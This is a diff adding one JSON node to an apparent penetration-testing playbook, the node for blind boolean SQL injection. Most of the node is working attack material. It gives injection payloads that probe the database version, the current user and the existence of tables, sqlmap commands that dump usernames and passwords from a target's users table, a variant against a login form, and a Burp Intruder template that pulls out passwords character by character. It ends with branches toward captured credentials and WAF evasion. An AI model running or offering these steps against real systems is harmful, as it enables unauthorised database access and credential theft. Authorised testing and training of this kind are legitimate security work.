@@ -1,0 +1,22 @@
+{
+  "id": "sqli_blind",
+  "phase": "WEB",
+  "title": "SQLi — Blind Boolean Extraction",
+  "body": "No data in response — only true/false behavior difference. PortSwigger: infer data one character at a time. Confirm the technique manually with 2-3 payloads then hand off to sqlmap.",
+  "cmd": "# -- CONFIRM BOOLEAN BLIND ----------------\n# True — normal response\n' AND 1=1--\n# False — different response (shorter, empty, redirect)\n' AND 1=2--\n# Must see a consistent behavioral difference\n\n# -- MANUAL CONFIRMATION (2-3 tests) -----\n# DB version starts with '8'?\n' AND substring(version(),1,1)='8'--\n# Current user is 'root'?\n' AND (SELECT user())='root'--\n# Table 'users' exists?\n' AND (SELECT count(*) FROM users)>0--\n\n# -- HAND OFF TO SQLMAP -------------------\n# Boolean-only technique flag:\nsqlmap -u \"http://$ip/page?id=1\" --technique=B --batch --level=3 --current-db\n\nsqlmap -u \"http://$ip/page?id=1\" --technique=B --batch   -D [dbname] -T users -C username,password --dump\n\n# POST data blind\nsqlmap -u \"http://$ip/login\" --data=\"user=a&pass=b\"   --technique=B --batch --level=3 --dbs\n\n# -- BURP INTRUDER (manual extraction) ----\n# Payload template:\n# ' AND substring((SELECT password FROM users LIMIT 0,1),§POS§,1)='§CHAR§'--\n# Cluster bomb: POS = 1..32, CHAR = a-z,0-9,special\n# True = different response Content-Length",
+  "warn": "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. Add --threads=5 to speed extraction.",
+  "choices": [
+    {
+      "label": "sqlmap extracting — got credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "Behavior too inconsistent — try time-based",
+      "next": "sqli_time"
+    },
+    {
+      "label": "WAF interfering",
+      "next": "sqli_waf"
+    }
+  ]
+}
